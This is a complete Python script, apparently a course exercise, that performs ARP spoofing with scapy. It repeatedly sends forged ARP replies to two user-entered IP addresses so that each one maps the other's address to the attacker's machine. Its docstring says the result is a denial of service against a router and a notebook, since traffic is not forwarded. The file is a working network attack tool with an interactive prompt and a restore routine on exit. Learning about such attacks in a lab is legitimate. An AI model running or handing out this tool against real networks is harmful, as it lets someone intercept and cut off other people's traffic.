#!/usr/bin/python3

import os
import sys
import crypt
import inspect
import subprocess
import scapy.all as scapy
from termcolor import colored
from urllib.request import urlopen


"""
31. Coding ARP Spoofer: arp_spoofer.py

This is actually :) a pretty neat program. Since we are not forwarding any
traffic between target X and target Z, we are creating a DOS attack. This works
by telling target X (router) that the mac address of my windoze 10 notebook is
my mac address by constantly updating the ARP table on the router. Further, we
are telling the windoze notebook that the mac address of the router is my mac
address by constantly updating the windoze notebook ARP table.

"""

# We use this dictionry to hold the mac address for each IP address so that only
# get that one time unlike the tutorial program which is constantly getting the
# mac address for both IPs.
ip_mac = {}


def lineno():
    """Call this to get the currently executing line number in the program. """
    return inspect.currentframe().f_back.f_lineno


def restore():
    """This function restores the ARP table on both devices by useing the data
    in ip_mac and sending two ARP response packets. Basically, just reversing
    what we did to manipulate it to start with."""
    ip_mac_list = list(ip_mac.items())

    packet = scapy.ARP(op=2)
    packet.psrc = ip_mac_list[0][0]
    packet.hwsrc = ip_mac_list[0][1]
    packet.pdst = ip_mac_list[1][0]
    packet.hwdst = ip_mac_list[1][1]
    scapy.send(packet, verbose=False)

    packet.psrc = ip_mac_list[1][0]
    packet.hwsrc = ip_mac_list[1][1]
    packet.pdst = ip_mac_list[0][0]
    packet.hwdst = ip_mac_list[0][1]
    scapy.send(packet, verbose=False)


def get_mac(ip):
    """This function gets the mac address of 'ip' and stores it in the
    dictionary. We only do this once."""
    if ip_mac[ip] == None:
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp = scapy.ARP(pdst=ip)
        packet = broadcast/arp
        answer = scapy.srp(packet, timeout=2, verbose=False)
        ip_mac[ip] = answer[0][0][1].hwsrc


def spoofer(target_ip, spoofed_ip):
    """This function updates the ARP table of the target IP with the IP address
    of the spoofed IP and our mac address associated with the spoofed IP. This
    effectively sends all traffic from the target IP to us. This ARP packet with
    op set to 2 means that it is a response to an ARP query. No has to send a
    request for a response to be generated. This updates the ARP packet on the
    target IP."""
    get_mac(ip=target_ip)
    packet = scapy.ARP(pdst=target_ip, hwdst=ip_mac[target_ip], op=2,
            psrc=spoofed_ip)
    scapy.send(packet, verbose=False)
    # print(ip_mac[target_ip])


def main():
    subprocess.call('clear', shell=True)

    target_x = input(colored("Enter target X IP address: ", 'yellow'))
    target_z = input(colored("Enter target Z IP address: ", 'yellow'))

    ip_mac[target_x] = None
    ip_mac[target_z] = None

    try:
        """We keep updating the ARP tables on both PCs with false information
        until a keyboard interrupt is pressed."""
        while True:
            spoofer(target_ip=target_x, spoofed_ip=target_z)
            spoofer(target_ip=target_z, spoofed_ip=target_x)
    except KeyboardInterrupt:
       restore()
       print(colored("\n\nAll is as it was...", 'green'))


if __name__ == "__main__":
    main()
